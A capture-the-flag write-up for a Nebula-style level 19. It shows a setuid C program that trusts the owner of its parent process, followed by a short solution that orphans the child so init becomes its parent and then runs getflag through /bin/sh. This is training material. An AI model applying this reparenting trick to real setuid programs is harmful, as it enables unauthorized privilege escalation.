# Level19

#### About

There is a flaw in the below program in how it operates. 
To do this level, log in as the level19 account with the password level19. Files for this level can be found in /home/flag19. 


#### Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
	pid_t pid;
	char buf[256];
	struct stat statbuf;

	/* Get the parent's /proc entry, so we can verify its user id */

	snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

	/* stat() it */

	if(stat(buf, &statbuf) == -1) {
		printf("Unable to check parent process\n");
		exit(EXIT_FAILURE);
	}

	/* check the owner id */

	if(statbuf.st_uid == 0) {
		/* If root started us, it is ok to start the shell */

		execve("/bin/sh", argv, envp);
		err(1, "Unable to execve");
	}

	printf("You are unauthorized to run this program\n");
}
```

#### Solutions

```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>

int main(void){
    pid_t pid;
    char* args[]= {"/bin/sh", "-c", "getflag > /tmp/flag19", NULL};
    pid = fork();
    if (pid==0){
        nice(19);
        execve("/home/flag19/flag19",args, NULL);
    }else if (pid <0){
        printf("Ups\n");
    }else{
        exit(1);
    }
    return 0;
}
```

#### Recommands

http://securityetalii.es/2012/08/10/soluciones-nebula-niveles-1719/

